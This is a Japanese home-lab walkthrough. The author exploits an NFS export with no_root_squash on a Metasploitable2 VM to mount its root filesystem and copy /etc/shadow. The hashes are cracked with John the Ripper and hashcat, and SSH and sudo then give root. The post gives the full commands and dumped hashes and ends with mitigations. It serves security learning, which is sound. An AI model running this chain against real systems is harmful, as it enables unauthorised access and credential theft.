---
title: "【自宅ラボ検証】NFSの設定ミス（no_root_squash）からshadow奪取→root化までやってみた"
date: 2026-09-17
tags: ["vulnerability", "JohntheRipper", "hashcat", "password", "KaliLinux", "Security"]
source: "[[nfs-no-root-squash-shadow-to-root]]"
---
# 初めに

[[linux-privilege-escalation-basics-hydra-suid-dirtycow]]

前回は上記の記事で、Hydraを使ったSSHパスワードクラック・SUIDが付与されたnmapの悪用・Dirty COWの3つを使ったLinux権限昇格のハンズオンを行いました。その中でHydraによって`user:user`のログイン情報を割ることには成功しましたが、`user`は一般ユーザーでsudo権限を持っておらず、そのままではroot化に至りませんでした。

今回は「では別のアカウントをブルートフォースすればいいのか？」ではなく、そもそも認証を突破する必要があるのかを疑うところから始めます。Metasploitable2にはNFS（Network File System）の設定ミスがあり、**SSHのログイン情報を一切知らなくても**、ファイルシステム全体、つまり`/etc/shadow`まで丸ごと取得できてしまいます。今回はこの設定ミスを悪用して認証情報のハッシュを取得し、それをJohn the Ripper/hashcatでオフラインクラックして、最終的にroot権限まで到達する流れを紹介します。

:::note warn
警告
本記事の内容は自宅ラボ内の隔離環境、および自分が所有・管理する仮想マシンに対してのみ実施しています。他人が管理するシステムに対して同様の行為を行うことは、不正アクセス禁止法などの法律に違反する可能性があります。本記事は検証目的に限定しており、悪用を推奨するものではありません。
:::

## サイバーキルチェーンで見る本記事の位置づけ

| 段階 | 内容 | 本記事での該当箇所 |
|---|---|---|
| ④脆弱性の悪用（Exploitation） | 標的への侵入 | NFSの設定ミス（no_root_squash）を悪用し、認証なしでファイルシステム全体（`/etc/shadow`含む）を取得 |
| ⑦目的の実行（Actions on Objectives） | 目的の達成 | 取得したハッシュをJohn the Ripper/hashcatでオフラインクラックし、実際にSSHログイン・sudo経由でroot権限まで到達 |

![ハッキングの全体フロー図.jpeg](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/7802ec5a-b298-4b6b-898d-26ac927b4a6c.jpeg)

# 用語
## NFS（no_root_squash）

NFS（Network File System）は、ネットワーク越しにファイルシステムを共有するための仕組みです。通常、クライアント側がroot権限（UID=0）でアクセスしてきた場合、サーバ側はそれを一般ユーザー（nobody等）に格下げして扱う「root_squash」という安全策が働きます。しかし`no_root_squash`が設定されていると、この格下げが行われず、クライアント側が「自分はrootだ」と申告した通りにサーバ側もroot権限としてアクセスを許可してしまいます。攻撃者は自分の管理するマシンで一時的にrootになりさえすれば、共有されているファイルシステム上のあらゆるファイル（本来rootしか読めないはずの`/etc/shadow`なども含む）に自由にアクセスできてしまいます。

## John the Ripper

入手済みのハッシュ化されたパスワード（今回であれば`/etc/shadow`から抜き出したもの）をオフラインで解析するパスワードクラックツールです。対象のサービスに直接アクセスする必要がなく、手元の環境で計算するため、試行がログに残らない「オフライン攻撃」に分類されます。

## hashcat

John the Ripperと同じくオフラインでのハッシュクラックツールですが、GPUでの並列計算を前提に設計されており、対応アルゴリズムの多さと処理速度の高さが特徴です。

# 環境構築
## NFSの確認
NFSのサービスポートがリッスン状態であることをnmapで確認します。
確認後、showmount -e "攻撃対象のIPアドレス"と実行することで対象のサーバのエクスポート状態を確認できます。
今回の場合はルートディレクトリ（"/"）が誰でも（"*"）マウントできる状態というとんでも設定になっていることがわかります。
```
# nmap 192.168.0.27 -sV -p 2049
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 20:49 +0900
Nmap scan report for 192.168.0.27
Host is up (0.00044s latency).

PORT     STATE SERVICE VERSION
2049/tcp open  nfs     2-4 (RPC #100003)
MAC Address: BC:24:11:5B:51:4E (Proxmox Server Solutions GmbH)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.75 seconds


# showmount -e 192.168.0.27        
Export list for 192.168.0.27:
/ *
```

これは攻撃対象側の/etc/exportsファイルの最終行に以下のような記載があるためです。
"no_root_squash"が問題となる設定です。
```
user@metasploitable:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync) hostname2(ro,sync)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt)
# /srv/nfs4/homes  gss/krb5i(rw,sync)
#

/       *(rw,sync,no_root_squash,no_subtree_check)
```

## マウントと/etc/passwd及びshadowの奪取
以下のコマンドを実行して、攻撃対象の"/"からマウントしていきます。
~~だいぶヤバいことをしてます。~~
/tmpディレクトリ配下にマウント用のディレクトリを作成して、そこに対して攻撃対象の"/"フォルダをマウントします。
```
# mkdir /tmp/nfs_mount   

# sudo mount -t nfs 192.168.0.27:/ /tmp/nfs_mount 
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
```

/tmp/nfs_mount配下を確認すると、攻撃対象のディレクトリ一式があることがわかります。
shadowファイルも確認出来てしまいました。
これでパスワードクラックの準備が整いました。
```
# ls -ltr /tmp/nfs_mount 
合計 6016
drwx------  2 root root   16384  3月 17  2010 lost+found
drwxr-xr-x  4 root root    4096  3月 17  2010 media
drwxr-xr-x  2 root root    4096  3月 17  2010 srv
drwxr-xr-x  2 root root    4096  3月 17  2010 opt
drwxr-xr-x  2 root root    4096  3月 17  2010 initrd
drwxr-xr-x 14 root root    4096  3月 17  2010 var
drwxr-xr-x  6 root root    4096  4月 16  2010 home
drwxr-xr-x 12 root root    4096  4月 28  2010 usr
dr-xr-xr-x  2 root root    4096  4月 29  2010 proc
drwxr-xr-x  2 root root    4096  4月 29  2010 sys
drwxr-xr-x  3 root root    4096  4月 29  2010 mnt
lrwxrwxrwx  1 root root      29  4月 29  2010 vmlinuz -> boot/vmlinuz-2.6.24-16-server
lrwxrwxrwx  1 root root      32  4月 29  2010 initrd.img -> boot/initrd.img-2.6.24-16-server
lrwxrwxrwx  1 root root      11  4月 29  2010 cdrom -> media/cdrom
drwxr-xr-x  3 root root    4096  4月 29  2010 boot
drwxr-xr-x  2 root root    4096  4月 29  2010 dev
drwxr-xr-x  2 root root    4096  5月 14  2012 sbin
drwxr-xr-x 13 root root    4096  5月 14  2012 lib
drwxr-xr-x  2 root root    4096  5月 14  2012 bin
-rwx------  1 root root 1205508  9月 15 18:01 JwDjwdcr
-rwx------  1 root root 1205508  9月 15 20:26 lMvFrUMUz
drwxr-xr-x 13 root root    4096  9月 15 22:27 root
-rw-------  1 root root    6542  9月 15 22:27 nohup.out
-rwx------  1 root root 1205508  9月 15 22:33 ogjBBotVFr
-rwx------  1 root root 1205508  9月 15 22:45 FwROFLRSooY
-rwx------  1 root root 1205508  9月 15 23:07 peIoZGWoI
drwxrwxrwt  6 root root    4096  9月 16 19:25 tmp
drwxr-xr-x 94 root root    4096  9月 17 14:42 etc

# cat /tmp/nfs_mount/etc/shadow
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
```

## John the Ripperでパスワードクラック
攻撃対象のpasswdとshadowファイルをkaliにコピーします。
```
# cp -p /tmp/nfs_mount/etc/passwd ./passwd
# cp -p /tmp/nfs_mount/etc/shadow ./shadow

# ls -ltr
合計 1228
-rw-r----- 1 root shadow    1207  5月 14  2012 shadow
-rwxrwxrwx 1 root root   1205508  9月 15 23:04 backdoor
-rw-r--r-- 1 root root         0  9月 16 10:20 server:
-rw-r--r-- 1 root root     40091  9月 16 10:35 hydra.restore
-rw-r--r-- 1 1001   1001    1581  9月 16 12:14 passwd
```

unshadowというコマンドを使ってJohn the Ripper用のファイルを生成します。
```
# unshadow passwd shadow > combined.txt
Created directory: /root/.john

# cat combined.txt  
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:0:0:root:/root:/bin/bash
daemon:*:1:1:daemon:/usr/sbin:/bin/sh
bin:*:2:2:bin:/bin:/bin/sh
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:3:3:sys:/dev:/bin/sh
sync:*:4:65534:sync:/bin:/bin/sync
games:*:5:60:games:/usr/games:/bin/sh
man:*:6:12:man:/var/cache/man:/bin/sh
lp:*:7:7:lp:/var/spool/lpd:/bin/sh
mail:*:8:8:mail:/var/mail:/bin/sh
news:*:9:9:news:/var/spool/news:/bin/sh
uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:*:13:13:proxy:/bin:/bin/sh
www-data:*:33:33:www-data:/var/www:/bin/sh
backup:*:34:34:backup:/var/backups:/bin/sh
list:*:38:38:Mailing List Manager:/var/list:/bin/sh
irc:*:39:39:ircd:/var/run/ircd:/bin/sh
gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:!:100:101::/var/lib/libuuid:/bin/sh
dhcp:*:101:102::/nonexistent:/bin/false
syslog:*:102:103::/home/syslog:/bin/false
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:103:104::/home/klog:/bin/false
sshd:*:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:*:105:113::/var/cache/bind:/bin/false
```

パスワードクラック用のワードリストを作成します。
kaliでは/usr/share/wordlistsディレクトリにワードリストのtxtファイルが複数用意されています。
今回はデフォルトで用意されているリストではクラック出来ないので、作成するイメージです。
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/84556619-6888-4b58-9035-02e32fc944d2.png)

今回は以下のようにしてpasswdやshadowに記載されたユーザ名やパスワードとしてありがちなパスワード等をcustom_wordlistというテキストファイルでまとめてみました。
```
# cat << 'EOF' > /usr/share/wordlists/custom_wordlist.txt
root
huga
hoge
password
P@ssw0rd
admin
user
service
postgres
klog
sys
123456789
batman
msfadmin
EOF

# cat /usr/share/wordlists/custom_wordlist.txt           
root
huga
hoge
password
P@ssw0rd
admin
user
service
postgres
klog
sys
123456789
batman
msfadmin
```

このワードリストを使ってJohnでパスワードクラックします。
```
# john --wordlist=/usr/share/wordlists/custom_wordlist.txt combined.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 7 password hashes with 7 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE2 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 14 candidates left, minimum 48 needed for performance.
user             (user)     
postgres         (postgres)     
msfadmin         (msfadmin)     
123456789        (klog)     
batman           (sys)     
service          (service)     
6g 0:00:00:00 DONE (2026-09-17 21:30) 300.0g/s 700.0p/s 4900c/s 4900C/s root..msfadmin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/c68eb372-4d80-492c-8b64-07eb873f3aed.png)


## hashcatでパスワードクラック
今回のハッシュは$1$（MD5crypt）形式なので、モードは500です。hashcatはshadowファイルの2列目（ハッシュ部分）だけを渡す必要があるので、まず抽出します。
```
# grep '\$1\$' shadow | cut -d: -f2 > shadow_hashes.txt

# cat shadow_hashes.txt
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//
```

抽出したファイルを対象にhashcatでパスワードクラックを仕掛けます。
```
# hashcat -m 500 -a 0 shadow_hashes.txt /usr/share/wordlists/custom_wordlist.txt
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/a37250fe-9cb0-4fb8-a790-2219b660b160.png)

パスワードクラックの結果は以下のコマンドでわかります。
各行の末尾がパスワードになります。
John the Ripper同様、rootのパスワードはクラック出来てませんが、root化出来るmsfadminのパスワードが割れてます。
```
# hashcat -m 500 shadow_hashes.txt --show                                   
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:msfadmin
$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:postgres
$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:user
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
```

## クラックしたパスワードでssh接続
sshコマンドを使って、kaliから攻撃対象にmsfadminでログインします。
ログインが出来て、root化もできてしまいました。
```
# ssh -F ~/.ssh/config_temp \
    -o "KexAlgorithms=diffie-hellman-group14-sha1" \
    -o "HostKeyAlgorithms=ssh-rsa" \
    -o "Ciphers=aes128-cbc" \
    -o "MACs=hmac-sha1" \
    -o "PubkeyAcceptedAlgorithms=+ssh-rsa" \
    msfadmin@192.168.0.27
msfadmin@192.168.0.27's password: 
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
No mail.
Last login: Thu Sep 17 08:10:47 2026 from 192.168.0.10
msfadmin@metasploitable:~$ 
msfadmin@metasploitable:~$ sudo -l
[sudo] password for msfadmin: 
User msfadmin may run the following commands on this host:
    (ALL) ALL
msfadmin@metasploitable:~$ sudo su -
root@metasploitable:~# 
```
![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3219385/924b6869-61d8-4508-a698-a44c2b28a7ea.png)

## この先の危険性
今回、実は一度もSSHのログイン試行をブルートフォースしていません。NFSの設定ミス（`no_root_squash`）1つだけで、認証を一切通さずにファイルシステム全体を取得できてしまいました。前回のHydraによるSSHブルートフォースであれば、失敗したログイン試行が対象側の認証ログに残りますが、今回の手法はそもそもSSHにすら触れていないため、`/var/log/auth.log`のような一般的な監視対象には一切痕跡が残りません。管理者からすると、気づく手がかりが非常に少ない攻撃だと言えます。

さらに厄介なのは、割れた6つのアカウント（`msfadmin`, `user`, `service`, `postgres`, `sys`, `klog`）がことごとく「ユーザー名とパスワードが同じ」「`batman`や`123456789`のような単純な文字列」だったことです。NFSの設定ミスという1つの穴から、パスワードポリシーの甘さという別の問題まで芋づる式に露呈してしまいました。

ここまでで`msfadmin`のsudo権限を使ってroot権限を取得できているので、この後は以下のような行為が可能になってしまいます。

- 以前の記事で紹介したmsfvenomのようなツールでバックドアを仕込み、永続的にアクセスを確保する
- ログの改ざん・削除による痕跡消去
- `/etc/shadow`だけでなく、システム上の任意のファイル（設定ファイル、アプリケーションのデータなど）の窃取
- 同一ネットワーク上の他のホストへの侵害範囲の拡大（ラテラルムーブメント）

[[metasploit-msfvenom-backdoor]]

## 対策

今回のような被害を防ぐには、以下のような対策が有効です。

- NFSのエクスポート設定で`no_root_squash`を使わない（デフォルトの`root_squash`のままにする）
- エクスポート対象を`*`（全ホスト）ではなく、信頼できる特定のホスト・ネットワークに限定する
- `/`のようなルートディレクトリ全体ではなく、共有が必要な範囲だけを最小限にエクスポートする
- NFSサービス（ポート2049）自体を、信頼できるネットワークセグメントからのみアクセス可能にする
- そもそも「ユーザー名とパスワードが同じ」「単純な文字列」といった推測されやすいパスワードを排除する

